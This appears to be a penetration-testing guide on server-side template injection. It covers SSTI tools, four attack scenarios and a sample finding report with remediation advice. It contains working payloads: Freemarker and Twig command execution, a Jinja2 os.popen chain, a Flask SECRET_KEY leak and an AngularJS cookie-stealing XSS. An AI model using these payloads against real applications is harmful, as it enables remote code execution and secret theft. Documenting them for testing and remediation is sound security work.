---
name: webapp-injection-ssti-template
description: "Webapp Injection Ssti Template."
domain: cybersecurity
---

|
| **tplmap** | Automated SSTI detection and exploitation with OS shell capability |
| **SSTImap** | Modern SSTI scanner with support for multiple template engines |
| **Burp Suite Professional** | Request interception and Intruder for payload fuzzing |
| **Hackvertor (Burp Extension)** | Payload encoding and transformation for bypass techniques |
| **PayloadsAllTheThings** | Comprehensive SSTI payload reference on GitHub |
| **OWASP ZAP** | Automated SSTI detection in active scanning mode |

## Common Scenarios

### Scenario 1: Flask Email Template Injection
A Flask application lets users customize email notification templates. The custom template is rendered with Jinja2 without sandboxing, allowing RCE through `{{config.items()}}` and subclass traversal.

### Scenario 2: Java CMS Freemarker Injection
A Java-based CMS allows administrators to edit page templates using Freemarker. A lower-privileged editor injects `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` to execute commands.

### Scenario 3: Error Page SSTI
A custom 404 error page reflects the requested URL path through a Twig template. Requesting `/{{['id']|filter('system')}}` causes the server to execute the `id` command.

### Scenario 4: AngularJS Client-Side Injection
A search page renders results using AngularJS with `ng-bind-html`. Searching for `{{constructor.constructor('alert(document.cookie)')()}}` achieves XSS through AngularJS expression evaluation.

## Output Format

```
## Template Injection Finding

**Vulnerability**: Server-Side Template Injection (Jinja2) - RCE
**Severity**: Critical (CVSS 9.8)
**Location**: GET /page?name= (name parameter)
**Template Engine**: Jinja2 (Python 3.9 / Flask 2.3)
**OWASP Category**: A03:2021 - Injection

### Reproduction Steps
1. Send GET /page?name={{7*7}} - Response contains "49" confirming SSTI
2. Send GET /page?name={{config.SECRET_KEY}} - Returns Flask secret key
3. Send GET /page?name={{cycler.__init__.__globals__.os.popen('id').read()}}
4. Server returns: uid=33(www-data) gid=33(www-data)

### Confirmed Impact
- Remote code execution as www-data user
- Secret key disclosure: Flask SECRET_KEY exposed
- File system read: /etc/passwd, application source code
- Potential lateral movement to internal network

### Recommendation
1. Never pass user input directly to template render functions
2. Use a sandboxed template environment (Jinja2 SandboxedEnvironment)
3. Implement strict input validation and allowlisting for template variables
4. Use logic-less template engines (Mustache, Handlebars) where possible
5. Apply least-privilege OS permissions for the web application user
```
